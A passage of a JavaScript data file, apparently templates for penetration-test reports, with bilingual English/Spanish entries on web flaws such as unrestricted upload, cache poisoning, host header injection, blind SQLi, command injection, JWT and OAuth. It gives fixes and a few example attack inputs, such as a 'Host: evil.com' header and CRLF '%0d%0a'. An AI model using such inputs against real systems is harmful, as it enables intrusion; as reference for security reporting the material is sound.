      technicalDescription_es: "### Descripción Técnica\nEl script del lado del cliente lee datos de una fuente controlada por el usuario (p. ej., `location.hash`) y los pasa a un sumidero peligroso (p. ej., `innerHTML`) sin la desinfección adecuada. Un atacante puede crear una URL que incluya una carga útil maliciosa en el fragmento, que luego es ejecutada por el script.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the client-side script, the source (e.g., `location.hash`), and the sink (e.g., `innerHTML`).]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el script del lado del cliente, la fuente (p. ej., `location.hash`) y el sumidero (p. ej., `innerHTML`).]",
      impact_en: "### Impact\nThis can lead to session hijacking, defacement, or redirection to malicious sites, similar to other forms of XSS.",
      impact_es: "### Impacto\nEsto puede llevar al secuestro de sesiones, la desfiguración o la redirección a sitios maliciosos, de forma similar a otras formas de XSS.",
      recommendations_en: "### Recommendations\nAvoid using user-controlled data in dangerous sinks. If necessary, use a safe method to render the data (e.g., `textContent` instead of `innerHTML`) or use a robust client-side sanitization library like DOMPurify.",
      recommendations_es: "### Recomendaciones\nEvitar el uso de datos controlados por el usuario en sumideros peligrosos. Si es necesario, usar un método seguro para representar los datos (p. ej., `textContent` en lugar de `innerHTML`) o usar una biblioteca de desinfección robusta del lado del cliente como DOMPurify.",
      references: ["https://owasp.org/www-community/attacks/DOM_Based_XSS"],
      tags: ["Additional", "XSS"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-081",
      title_en: "Unrestricted File Upload",
      title_es: "Subida de Archivos sin Restricciones",
      cwe: "CWE-434",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nThe application allows users to upload files without properly restricting the file type, size, or content. This can allow an attacker to upload a web shell or other malicious file.",
      overview_es: "### Resumen\nLa aplicación permite a los usuarios subir archivos sin restringir adecuadamente el tipo, tamaño o contenido del archivo. Esto puede permitir que un atacante suba una shell web u otro archivo malicioso.",
      technicalDescription_en: "### Technical Description\nThe file upload functionality does not validate the file's extension or MIME type on the server side. An attacker can upload a file with an executable extension (e.g., `.php`, `.jsp`) and then access it via its URL to execute code on the server.",
      technicalDescription_es: "### Descripción Técnica\nLa funcionalidad de subida de archivos no valida la extensión o el tipo MIME del archivo en el lado del servidor. Un atacante puede subir un archivo con una extensión ejecutable (p. ej., `.php`, `.jsp`) y luego acceder a él a través de su URL para ejecutar código en el servidor.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the file upload functionality.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad de subida de archivos.]",
      impact_en: "### Impact\nThis can lead to remote code execution and full server compromise.",
      impact_es: "### Impacto\nEsto puede conducir a la ejecución remota de código y al compromiso total del servidor.",
      recommendations_en: "### Recommendations\nImplement a strict whitelist of allowed file extensions and MIME types. Rename uploaded files to a random string and store them outside of the web root. Use a content scanner to check for malicious content.",
      recommendations_es: "### Recomendaciones\nImplementar una lista blanca estricta de extensiones de archivo y tipos MIME permitidos. Renombrar los archivos subidos a una cadena aleatoria y almacenarlos fuera de la raíz web. Usar un escáner de contenido para buscar contenido malicioso.",
      references: ["https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"],
      tags: ["Additional", "File Upload"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-082",
      title_en: "Business Logic Flaws",
      title_es: "Fallos en la Lógica de Negocio",
      cwe: "CWE-840",
      severity: "Medium",
      cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
      overview_en: "### Overview\nBusiness logic flaws are ways of using the legitimate processing flow of an application in a way that results in a negative consequence to the organization.",
      overview_es: "### Resumen\nLos fallos de lógica de negocio son formas de utilizar el flujo de procesamiento legítimo de una aplicación de una manera que resulta en una consecuencia negativa para la organización.",
      technicalDescription_en: "### Technical Description\nThese vulnerabilities are specific to the application's domain. Examples include manipulating a checkout process to get items for free, bypassing a workflow, or abusing a password reset process to lock out users. These are not typically found by automated scanners.",
      technicalDescription_es: "### Descripción Técnica\nEstas vulnerabilidades son específicas del dominio de la aplicación. Los ejemplos incluyen la manipulación de un proceso de pago para obtener artículos gratis, eludir un flujo de trabajo o abusar de un proceso de restablecimiento de contraseña para bloquear a los usuarios. Normalmente, no se encuentran con escáneres automatizados.",
      affectedComponents_en: "### Affected Components\n[TODO: Describe the business process and how it can be abused.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Describir el proceso de negocio y cómo se puede abusar de él.]",
      impact_en: "### Impact\nThe impact can range from financial loss to reputational damage, depending on the specific flaw.",
      impact_es: "### Impacto\nEl impacto puede variar desde la pérdida financiera hasta el daño a la reputación, dependiendo del fallo específico.",
      recommendations_en: "### Recommendations\nThoroughly model the application's business logic and workflows. Perform manual, in-depth testing to identify potential abuse cases. Implement server-side checks to enforce the intended logic.",
      recommendations_es: "### Recomendaciones\nModelar a fondo la lógica de negocio y los flujos de trabajo de la aplicación. Realizar pruebas manuales y en profundidad para identificar posibles casos de abuso. Implementar comprobaciones del lado del servidor para hacer cumplir la lógica prevista.",
      references: ["https://portswigger.net/web-security/business-logic-vulnerabilities"],
      tags: ["Additional", "Business Logic"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-083",
      title_en: "API Security Misconfiguration",
      title_es: "Configuración Insegura de API",
      cwe: "CWE-16",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nAPIs are often misconfigured, leading to vulnerabilities such as missing authentication, excessive data exposure, or weak rate limiting.",
      overview_es: "### Resumen\nLas API a menudo están mal configuradas, lo que lleva a vulnerabilidades como la falta de autenticación, la exposición excesiva de datos o una limitación de velocidad débil.",
      technicalDescription_en: "### Technical Description\nThis covers a wide range of issues, such as an API endpoint that returns too much data (e.g., including admin fields for non-admin users), an endpoint that is missing authentication, or an endpoint that does not properly rate limit requests, allowing for brute-force attacks.",
      technicalDescription_es: "### Descripción Técnica\nEsto cubre una amplia gama de problemas, como un endpoint de API que devuelve demasiados datos (p. ej., incluyendo campos de administrador para usuarios no administradores), un endpoint que carece de autenticación o un endpoint que no limita adecuadamente las solicitudes, lo que permite ataques de fuerza bruta.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the vulnerable API endpoint and the nature of the misconfiguration.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el endpoint de API vulnerable y la naturaleza de la configuración incorrecta.]",
      impact_en: "### Impact\nThis can lead to data breaches, account takeover, and denial of service.",
      impact_es: "### Impacto\nEsto puede llevar a violaciones de datos, toma de control de cuentas y denegación de servicio.",
      recommendations_en: "### Recommendations\nFollow the OWASP API Security Top 10. Implement strong authentication and authorization on all endpoints. Implement rate limiting and resource quotas. Design responses to return only the necessary data.",
      recommendations_es: "### Recomendaciones\nSeguir el Top 10 de Seguridad de API de OWASP. Implementar una autenticación y autorización fuertes en todos los endpoints. Implementar limitación de velocidad y cuotas de recursos. Diseñar las respuestas para que devuelvan solo los datos necesarios.",
      references: ["https://owasp.org/www-project-api-security/"],
      tags: ["Additional", "API Security"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-084",
      title_en: "Insecure Cookies",
      title_es: "Cookies Inseguras",
      cwe: "CWE-1004",
      severity: "Medium",
      cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
      overview_en: "### Overview\nSession cookies are not configured with the necessary security attributes, making them vulnerable to hijacking.",
      overview_es: "### Resumen\nLas cookies de sesión no están configuradas con los atributos de seguridad necesarios, lo que las hace vulnerables al secuestro.",
      technicalDescription_en: "### Technical Description\nSession cookies are missing the `Secure`, `HttpOnly`, and/or `SameSite` flags. The `Secure` flag ensures the cookie is only sent over HTTPS. The `HttpOnly` flag prevents it from being accessed by client-side scripts (mitigating XSS). The `SameSite` flag helps prevent CSRF attacks.",
      technicalDescription_es: "### Descripción Técnica\nLas cookies de sesión carecen de los indicadores `Secure`, `HttpOnly` y/o `SameSite`. El indicador `Secure` asegura que la cookie solo se envíe a través de HTTPS. El indicador `HttpOnly` evita que sea accedida por scripts del lado del cliente (mitigando XSS). El indicador `SameSite` ayuda a prevenir ataques CSRF.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the cookie and the missing attributes.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la cookie y los atributos faltantes.]",
      impact_en: "### Impact\nThis increases the risk of session hijacking via XSS or packet sniffing.",
      impact_es: "### Impacto\nEsto aumenta el riesgo de secuestro de sesión a través de XSS o análisis de paquetes.",
      recommendations_en: "### Recommendations\nSet the `Secure`, `HttpOnly`, and `SameSite=Strict` (or `Lax`) attributes for all session cookies.",
      recommendations_es: "### Recomendaciones\nEstablecer los atributos `Secure`, `HttpOnly` y `SameSite=Strict` (o `Lax`) para todas las cookies de sesión.",
      references: ["https://owasp.org/www-project-cheat-sheets/cheatsheets/Session_Management_Cheat_Sheet.html#cookie-attributes"],
      tags: ["Additional", "Session"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-085",
      title_en: "HTTP Response Splitting",
      title_es: "División de Respuestas HTTP",
      cwe: "CWE-113",
      severity: "Medium",
      cvss: { score: 6.1, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "C", confidentiality: "L", integrity: "L", availability: "N" },
      overview_en: "### Overview\nHTTP response splitting is a web security vulnerability that occurs when an attacker can inject newline characters into an HTTP response header.",
      overview_es: "### Resumen\nLa división de respuestas HTTP es una vulnerabilidad de seguridad web que ocurre cuando un atacante puede inyectar caracteres de nueva línea en una cabecera de respuesta HTTP.",
      technicalDescription_en: "### Technical Description\nIf an application includes user-supplied input in a response header without proper sanitization, an attacker can inject CRLF characters (`%0d%0a`) to split the header and inject their own headers or content into the response body. This can be used to perform cross-site scripting (XSS) or cache poisoning attacks.",
      technicalDescription_es: "### Descripción Técnica\nSi una aplicación incluye la entrada proporcionada por el usuario en una cabecera de respuesta sin la desinfección adecuada, un atacante puede inyectar caracteres CRLF (`%0d%0a`) para dividir la cabecera e inyectar sus propias cabeceras o contenido en el cuerpo de la respuesta. Esto se puede usar para realizar ataques de scripts entre sitios (XSS) o de envenenamiento de caché.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the vulnerable parameter and header.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el parámetro y la cabecera vulnerables.]",
      impact_en: "### Impact\nThis can lead to XSS, cache poisoning, and other client-side attacks.",
      impact_es: "### Impacto\nEsto puede llevar a XSS, envenenamiento de caché y otros ataques del lado del cliente.",
      recommendations_en: "### Recommendations\nSanitize all user input before including it in HTTP headers. Specifically, filter out CRLF and other newline characters.",
      recommendations_es: "### Recomendaciones\nDesinfectar todas las entradas del usuario antes de incluirlas en las cabeceras HTTP. Específicamente, filtrar los caracteres CRLF y otros de nueva línea.",
      references: ["https://owasp.org/www-community/attacks/HTTP_Response_Splitting"],
      tags: ["Additional", "Injection"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-086",
      title_en: "Web Cache Poisoning",
      title_es: "Envenenamiento de Caché Web",
      cwe: "CWE-444",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nWeb cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users.",
      overview_es: "### Resumen\nEl envenenamiento de caché web es una técnica avanzada mediante la cual un atacante explota el comportamiento de un servidor web y una caché para que se sirva una respuesta HTTP dañina a otros usuarios.",
      technicalDescription_en: "### Technical Description\nThe attacker crafts a request that elicits a malicious response from the server. This response is then stored in the cache. When other users request the same resource, they receive the poisoned response from the cache.",
      technicalDescription_es: "### Descripción Técnica\nEl atacante crea una solicitud que provoca una respuesta maliciosa del servidor. Esta respuesta se almacena luego en la caché. Cuando otros usuarios solicitan el mismo recurso, reciben la respuesta envenenada de la caché.",
      affectedComponents_en: "### Affected Components\n[TODO: Describe the cache mechanism and the specific request used to poison it.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Describir el mecanismo de caché y la solicitud específica utilizada para envenenarla.]",
      impact_en: "### Impact\nThis can lead to widespread XSS attacks, session hijacking, and other client-side vulnerabilities affecting a large number of users.",
      impact_es: "### Impacto\nEsto puede llevar a ataques XSS generalizados, secuestro de sesiones y otras vulnerabilidades del lado del cliente que afectan a un gran número de usuarios.",
      recommendations_en: "### Recommendations\nConfigure the cache to not store responses that contain user input. Use cache keys that are specific enough to prevent collisions. Disable caching for dynamic content.",
      recommendations_es: "### Recomendaciones\nConfigurar la caché para no almacenar respuestas que contengan entradas de usuario. Usar claves de caché que sean lo suficientemente específicas para evitar colisiones. Deshabilitar el almacenamiento en caché para contenido dinámico.",
      references: ["https://portswigger.net/web-security/web-cache-poisoning"],
      tags: ["Additional", "Cache Poisoning"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-087",
      title_en: "Host Header Injection",
      title_es: "Inyección en Cabecera Host",
      cwe: "CWE-74",
      severity: "Medium",
      cvss: { score: 6.1, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "C", confidentiality: "L", integrity: "L", availability: "N" },
      overview_en: "### Overview\nThe application trusts the `Host` header to generate links or import scripts. An attacker can manipulate this header to cause the application to generate malicious URLs.",
      overview_es: "### Resumen\nLa aplicación confía en la cabecera `Host` para generar enlaces o importar scripts. Un atacante puede manipular esta cabecera para hacer que la aplicación genere URL maliciosas.",
      technicalDescription_en: "### Technical Description\nAn attacker sends a request with a modified `Host` header (e.g., `Host: evil.com`). If the application uses this header to construct password reset links or canonical URLs, the attacker can poison these links to point to their own domain.",
      technicalDescription_es: "### Descripción Técnica\nUn atacante envía una solicitud con una cabecera `Host` modificada (p. ej., `Host: evil.com`). Si la aplicación utiliza esta cabecera para construir enlaces de restablecimiento de contraseña o URL canónicas, el atacante puede envenenar estos enlaces para que apunten a su propio dominio.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the functionality that relies on the Host header, e.g., password reset emails.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad que depende de la cabecera Host, p. ej., correos electrónicos de restablecimiento de contraseña.]",
      impact_en: "### Impact\nThis can be used to facilitate phishing attacks, web cache poisoning, and other attacks.",
      impact_es: "### Impacto\nEsto se puede utilizar para facilitar ataques de phishing, envenenamiento de caché web y otros ataques.",
      recommendations_en: "### Recommendations\nDo not trust the `Host` header. Use a server-side, statically configured value for the application's domain name.",
      recommendations_es: "### Recomendaciones\nNo confiar en la cabecera `Host`. Utilizar un valor estático configurado en el lado del servidor para el nombre de dominio de la aplicación.",
      references: ["https://portswigger.net/web-security/host-header"],
      tags: ["Additional", "Injection"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-088",
      title_en: "SQLi Blind",
      title_es: "Inyección SQL Ciega",
      cwe: "CWE-89",
      severity: "High",
      cvss: { score: 8.6, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "C", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nBlind SQL injection is a type of SQL injection attack that asks the database true or false questions and determines the answer based on the application's response.",
      overview_es: "### Resumen\nLa inyección SQL ciega es un tipo de ataque de inyección SQL que le hace a la base de datos preguntas de verdadero o falso y determina la respuesta basándose en la respuesta de la aplicación.",
      technicalDescription_en: "### Technical Description\nThis attack is used when the web application is configured to show generic error messages, but has not mitigated the SQL injection vulnerability. An attacker can use boolean-based or time-based techniques to exfiltrate data from the database, character by character.",
      technicalDescription_es: "### Descripción Técnica\nEste ataque se utiliza cuando la aplicación web está configurada para mostrar mensajes de error genéricos, pero no ha mitigado la vulnerabilidad de inyección SQL. Un atacante puede usar técnicas basadas en booleanos o en tiempo para exfiltrar datos de la base de datos, carácter por carácter.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the vulnerable parameter.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el parámetro vulnerable.]",
      impact_en: "### Impact\nAn attacker can exfiltrate sensitive data from the database, although it is a slower process than a regular SQL injection.",
      impact_es: "### Impacto\nUn atacante puede exfiltrar datos sensibles de la base de datos, aunque es un proceso más lento que una inyección SQL normal.",
      recommendations_en: "### Recommendations\nUse parameterized queries (prepared statements) for all database interactions. This is the most effective way to prevent all forms of SQL injection.",
      recommendations_es: "### Recomendaciones\nUtilizar consultas parametrizadas (sentencias preparadas) para todas las interacciones con la base de datos. Esta es la forma más efectiva de prevenir todas las formas de inyección SQL.",
      references: ["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
      tags: ["Additional", "SQLi"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-089",
      title_en: "OS Command Injection",
      title_es: "Inyección de Comandos del SO",
      cwe: "CWE-78",
      severity: "Critical",
      cvss: { score: 9.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nOS command injection is a web security vulnerability that allows an attacker to execute arbitrary operating system commands on the server that is running an application.",
      overview_es: "### Resumen\nLa inyección de comandos del SO es una vulnerabilidad de seguridad web que permite a un atacante ejecutar comandos arbitrarios del sistema operativo en el servidor que está ejecutando una aplicación.",
      technicalDescription_en: "### Technical Description\nThe application passes unsafe user-supplied input to a system shell. An attacker can use shell metacharacters to inject arbitrary commands.",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación pasa una entrada no segura proporcionada por el usuario a un shell del sistema. Un atacante puede usar metacaracteres de shell para inyectar comandos arbitrarios.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the vulnerable functionality and parameter.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad y el parámetro vulnerables.]",
      impact_en: "### Impact\nThis can lead to full compromise of the server.",
      impact_es: "### Impacto\nEsto puede llevar al compromiso total del servidor.",
      recommendations_en: "### Recommendations\nAvoid calling out to OS commands directly. Use built-in library functions where possible. If you must use user input in a command, use strict whitelisting and input validation.",
      recommendations_es: "### Recomendaciones\nEvitar llamar directamente a los comandos del SO. Usar funciones de biblioteca integradas siempre que sea posible. Si debe usar la entrada del usuario en un comando, use una lista blanca estricta y validación de entrada.",
      references: ["https://portswigger.net/web-security/os-command-injection"],
      tags: ["Additional", "Injection"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-090",
      title_en: "XSS Persistent",
      title_es: "XSS Persistente",
      cwe: "CWE-79",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nPersistent (or stored) XSS is a type of XSS where the attacker's payload is saved on the server and then displayed to other users.",
      overview_es: "### Resumen\nEl XSS persistente (o almacenado) es un tipo de XSS en el que la carga útil del atacante se guarda en el servidor y luego se muestra a otros usuarios.",
      technicalDescription_en: "### Technical Description\nAn attacker injects a malicious script into a part of the application that stores user input, such as a comment section or user profile. When other users view the page, the script is executed in their browser.",
      technicalDescription_es: "### Descripción Técnica\nUn atacante inyecta un script malicioso en una parte de la aplicación que almacena la entrada del usuario, como una sección de comentarios o un perfil de usuario. Cuando otros usuarios ven la página, el script se ejecuta en su navegador.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the functionality where the malicious script is stored, e.g., comment form.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad donde se almacena el script malicioso, p. ej., formulario de comentarios.]",
      impact_en: "### Impact\nThis can lead to session hijacking, defacement, and other client-side attacks affecting all users who view the malicious content.",
      impact_es: "### Impacto\nEsto puede llevar al secuestro de sesiones, la desfiguración y otros ataques del lado del cliente que afectan a todos los usuarios que ven el contenido malicioso.",
      recommendations_en: "### Recommendations\nImplement context-aware output encoding for all user-supplied data. Use a library like DOMPurify to sanitize HTML content if users are allowed to submit rich text.",
      recommendations_es: "### Recomendaciones\nImplementar codificación de salida sensible al contexto para todos los datos proporcionados por el usuario. Usar una biblioteca como DOMPurify para desinfectar el contenido HTML si se permite a los usuarios enviar texto enriquecido.",
      references: ["https://owasp.org/www-community/attacks/xss/"],
      tags: ["Additional", "XSS"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-091",
      title_en: "CSRF Token Leakage",
      title_es: "Filtración de Tokens CSRF",
      cwe: "CWE-200",
      severity: "Medium",
      cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nThe application leaks the anti-CSRF token, allowing an attacker to bypass CSRF protection.",
      overview_es: "### Resumen\nLa aplicación filtra el token anti-CSRF, lo que permite a un atacante eludir la protección CSRF.",
      technicalDescription_en: "### Technical Description\nThe anti-CSRF token is exposed in a way that an attacker can retrieve it, for example, by including it in a URL that is then leaked via the Referer header, or by storing it in a non-HttpOnly cookie accessible via XSS.",
      technicalDescription_es: "### Descripción Técnica\nEl token anti-CSRF se expone de una manera que un atacante puede recuperarlo, por ejemplo, incluyéndolo en una URL que luego se filtra a través de la cabecera Referer, o almacenándolo en una cookie no HttpOnly accesible a través de XSS.",
      affectedComponents_en: "### Affected Components\n[TODO: Describe how the CSRF token is being leaked.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Describir cómo se está filtrando el token CSRF.]",
      impact_en: "### Impact\nAn attacker can craft a valid request to perform a CSRF attack, bypassing the intended protection.",
      impact_es: "### Impacto\nUn atacante puede crear una solicitud válida para realizar un ataque CSRF, eludiendo la protección prevista.",
      recommendations_en: "### Recommendations\nEnsure that CSRF tokens are not leaked in URLs or logs. Bind the token to the user's session. Use the double-submit cookie pattern correctly.",
      recommendations_es: "### Recomendaciones\nAsegurarse de que los tokens CSRF no se filtren en las URL o los registros. Vincular el token a la sesión del usuario. Usar correctamente el patrón de doble envío de cookies.",
      references: ["https://portswigger.net/web-security/csrf/tokens"],
      tags: ["Additional", "CSRF"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-092",
      title_en: "JWT Vulnerabilities",
      title_es: "Vulnerabilidades en JWT",
      cwe: "CWE-345",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nThe application's implementation of JSON Web Tokens (JWT) is insecure, allowing for signature bypass, algorithm confusion, or other attacks.",
      overview_es: "### Resumen\nLa implementación de la aplicación de JSON Web Tokens (JWT) es insegura, lo que permite la omisión de firmas, la confusión de algoritmos u otros ataques.",
      technicalDescription_en: "### Technical Description\nThis includes vulnerabilities like accepting JWTs with the `alg` header set to `none`, using weak secrets for signing, or not validating claims like `exp` or `nbf`.",
      technicalDescription_es: "### Descripción Técnica\nEsto incluye vulnerabilidades como aceptar JWT con la cabecera `alg` establecida en `none`, usar secretos débiles para firmar o no validar reclamaciones como `exp` o `nbf`.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the JWT implementation and the specific flaw.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la implementación de JWT y el fallo específico.]",
      impact_en: "### Impact\nAn attacker can forge valid JWTs to impersonate other users, escalate privileges, or bypass authentication.",
      impact_es: "### Impacto\nUn atacante puede falsificar JWT válidos para suplantar a otros usuarios, escalar privilegios u omitir la autenticación.",
      recommendations_en: "### Recommendations\nUse a strong, secret key for signing. Always validate the signature and the `alg` header. Enforce validation of all standard claims. Use a well-vetted JWT library.",
      recommendations_es: "### Recomendaciones\nUsar una clave secreta fuerte para firmar. Validar siempre la firma y la cabecera `alg`. Forzar la validación de todas las reclamaciones estándar. Usar una biblioteca JWT bien examinada.",
      references: ["https://jwt.io/introduction"],
      tags: ["Additional", "JWT"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-093",
      title_en: "OAuth Misconfiguration",
      title_es: "Configuración Incorrecta de OAuth",
      cwe: "CWE-284",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nThe OAuth 2.0 implementation is misconfigured, leading to vulnerabilities like redirect URI validation bypass or leaking authorization codes.",
      overview_es: "### Resumen\nLa implementación de OAuth 2.0 está mal configurada, lo que lleva a vulnerabilidades como la omisión de la validación de la URI de redirección o la filtración de códigos de autorización.",
      technicalDescription_en: "### Technical Description\nThe application may have a permissive redirect URI validation, allowing an attacker to steal authorization codes. Other issues include improper handling of the `state` parameter, leading to CSRF, or leaking codes in logs or Referer headers.",
      technicalDescription_es: "### Descripción Técnica\nLa aplicación puede tener una validación de URI de redirección permisiva, lo que permite a un atacante robar códigos de autorización. Otros problemas incluyen el manejo incorrecto del parámetro `state`, lo que lleva a CSRF, o la filtración de códigos en registros o cabeceras Referer.",
      affectedComponents_en: "### Affected Components\n[TODO: Describe the specific OAuth misconfiguration.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Describir la configuración incorrecta de OAuth específica.]",
      impact_en: "### Impact\nThis can lead to account takeover, allowing an attacker to impersonate a user.",
      impact_es: "### Impacto\nEsto puede llevar a la toma de control de cuentas, permitiendo a un atacante suplantar a un usuario.",
      recommendations_en: "### Recommendations\nUse a strict, exact-match whitelist for redirect URIs. Use the `state` parameter to prevent CSRF. Use the PKCE extension for mobile and single-page applications.",
      recommendations_es: "### Recomendaciones\nUsar una lista blanca estricta y de coincidencia exacta para las URI de redirección. Usar el parámetro `state` para prevenir CSRF. Usar la extensión PKCE para aplicaciones móviles y de una sola página.",
      references: ["https://oauth.net/2/"],
      tags: ["Additional", "OAuth"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-094",
      title_en: "GraphQL Injection",
      title_es: "Inyección GraphQL",
      cwe: "CWE-943",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nGraphQL injection vulnerabilities occur when user-controlled input is used to dynamically construct a GraphQL query, allowing an attacker to manipulate the query.",
      overview_es: "### Resumen\nLas vulnerabilidades de inyección de GraphQL ocurren cuando la entrada controlada por el usuario se usa para construir dinámicamente una consulta GraphQL, lo que permite a un atacante manipular la consulta.",
      technicalDescription_en: "### Technical Description\nSimilar to SQL injection, but for GraphQL. An attacker can inject malicious query fragments to access data they are not authorized to see or perform unauthorized mutations.",
      technicalDescription_es: "### Descripción Técnica\nSimilar a la inyección SQL, pero para GraphQL. Un atacante puede inyectar fragmentos de consulta maliciosos para acceder a datos que no está autorizado a ver o realizar mutaciones no autorizadas.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the functionality that constructs GraphQL queries from user input.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad que construye consultas GraphQL a partir de la entrada del usuario.]",
      impact_en: "### Impact\nThis can lead to unauthorized data access and manipulation.",
      impact_es: "### Impacto\nEsto puede llevar a un acceso y manipulación de datos no autorizados.",
      recommendations_en: "### Recommendations\nUse parameterized queries (GraphQL variables). Avoid building queries from user-controlled strings. Implement proper access control on all fields and types in the GraphQL schema.",
      recommendations_es: "### Recomendaciones\nUtilizar consultas parametrizadas (variables de GraphQL). Evitar construir consultas a partir de cadenas controladas por el usuario. Implementar un control de acceso adecuado en todos los campos y tipos en el esquema de GraphQL.",
      references: ["https://graphql.org/learn/security/"],
      tags: ["Additional", "GraphQL"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-095",
      title_en: "WebSocket Security Issues",
      title_es: "Problemas de Seguridad en WebSocket",
      cwe: "CWE-284",
      severity: "Medium",
